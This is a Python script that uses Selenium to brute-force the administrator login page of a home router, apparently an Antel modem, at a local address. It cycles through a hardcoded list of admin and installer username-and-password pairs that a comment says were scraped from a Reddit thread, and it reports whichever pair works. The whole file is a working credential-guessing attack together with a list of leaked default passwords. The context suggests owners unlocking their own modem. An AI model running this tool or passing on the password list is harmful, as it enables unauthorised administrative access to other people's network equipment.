# NOTE: Most passwords are scrapped from this Reddit thread:
# NOTE: https://old.reddit.com/r/uruguay/comments/nqs5g2

from contextlib import suppress
import sys
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (
    NoSuchElementException,
    InvalidElementStateException,
)

WEBGUI_URL = "http://192.168.1.1/"
WEBGUI_SLEEP = 3
DEFAULT_CREDENTIALS = "user:user"
ADMIN_CREDENTIALS = """
    admin:1234
    admin:5DhD64Je
    admin:5u4r3Z=%
    admin:admin
    admin:F4l_qu3Z
    admin:h83L22s
    admin:Kj$7_cap
    admin:Mo23ZE1e
    admin:Nh83L22s
    admin:nP19FWy5
    admin:nP19FWy5?
    admin:P19FWy5
    admin:pw12Wr26
    admin:Ql52jP23
    admin:Rn32pQce
    admin:Wta77P9E
    admin:ZH1wjp23
    admin:CalVxePV1
"""
INSTALLADOR_CREDENTIALS = """
    instalador:wwzz2233
    instalador:wwzz2233
"""


def bruteforce(url: str = WEBGUI_URL, sleep: int = WEBGUI_SLEEP) -> None:
    credentials_list: list[tuple[str, str]] = []
    used_dictionaries: tuple[str, ...] = (
        ADMIN_CREDENTIALS,
        INSTALLADOR_CREDENTIALS,
    )
    for dictionary in used_dictionaries:
        for pair in dictionary.splitlines():
            pair = pair.strip()
            if not pair or pair.startswith("#"):
                continue

            user, password = pair.split(":")
            credentials_list.append((user, password))

    print(f"==> Trying {len(credentials_list)} credentials")
    # Open Selenium session for Firefox
    with webdriver.Firefox() as driver:
        # Open WebGUI
        driver.get(url)

        # Looping credentials
        for user, password in credentials_list:
            try:
                user_form = driver.find_element(By.NAME, "Username")
                password_form = driver.find_element(By.NAME, "Password")
            except NoSuchElementException:
                print("==> ERROR: Can't find a login form. Invalid URL?")
                sys.exit(1)

            print("=> Waiting for a form to be ready")
            while True:
                try:
                    user_form.clear()
                    user_form.send_keys(user)
                    password_form.clear()
                    password_form.send_keys(password)
                    break
                except InvalidElementStateException:
                    time.sleep(sleep)

            print(f"=> Trying `{user}:{password}`")

            # Submitting form
            driver.find_element(By.ID, "LoginId").click()

            # Checking response
            success = 'start.ghtml' in driver.current_url
            if success:
                print("==> 🥳🎉 Gotcha Antel! 🥳🎉")
                print(f"==> Crenentials: `{user}:{password}`")
                quit(0)

            time.sleep(sleep)

        print(
            "=> No luck. Factory reset modem and try again BEFORE connecting the fiber."
        )
        quit(1)


if __name__ == "__main__":
    args = sys.argv[1:]
    url = args[0] if args[0] else WEBGUI_URL
    if not url.startswith("http"):
        url = "http://" + url

    with suppress(KeyboardInterrupt):
        bruteforce(url)
